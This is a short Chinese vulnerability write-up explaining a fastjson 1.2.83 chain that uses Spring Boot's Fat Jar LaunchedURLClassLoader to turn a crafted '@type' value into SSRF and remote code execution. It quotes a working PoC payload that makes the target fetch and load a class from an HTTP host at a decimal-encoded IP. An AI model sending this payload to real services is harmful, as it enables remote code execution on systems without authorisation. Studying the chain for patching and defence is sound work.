fastjson漏洞分析1.2.83

综合分析了一下链子不难，这个链子的核心点是利用了spring boot对classLoader类的重写，LaunchedURLClassLoader这个类是可以进行远程加载。

这个的利用前提1、java包运行；2、采用了Fat Jar打包方式；

对于SpringBoot方式进行Fat Jar打包，其实是包含了项目所有依赖的jar，这样就可以调用其他的jar包中的代码。

代码分析

首先分析一下网传POC{“@type”:”jar:http:..2130706433:18080.probe!.POC”,”x”:1}，动态调试，

看到@type根据之前文章分析，几乎可以肯定是在这个循环里面

if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect))

走向clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures());

在checkAutoType()函数中String resource = typeName.replace(‘.’, ‘/‘) + “.class”;对传入的typeaname参数进行传入处理。参数把.替换成了/。转换成了一个http协议的16进制写法，并且拼接好了要获取的文件后缀class。

jar:http:..2130706433:18080.probe!.POC <-> jar:http://2130706433:18080/probe!/POC.class

SSRF

getResourceAsStream从远端拉取到了resource地址的字节码，在交由getClassLoader进行加载。（这个就是SSRF）

收到相关请求

RCE

类加载调用了TypeUtils.loadClass()

在TypeUtils.loadClass函数中先进行异步线程，这个线程从内存中加载传入的类的名称，如果是非Fat Jar打包方式，这个jar文件无法从内存中获取到，只能获取到自己本身jar包的代码，因为使用了Fat Jar打包，这种方式是LaunchedURLClassLoader进行加载，这个是可以加载本地中的jar文件的代码。

ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();

contextClassLoader参数

再通过contextClassLoader.loadClass进行静态初始类，从而达到RCE。

clazz = contextClassLoader.loadClass(className);

总结

这个链子不算难，但是利用了spring boot的Fat Jar打包方式的特性，通过LaunchedURLClassLoader可以进行本地加载相关类，在进行静态化初始类和对IP点的处理直接采用了16进制的写法。（对大佬膜拜）
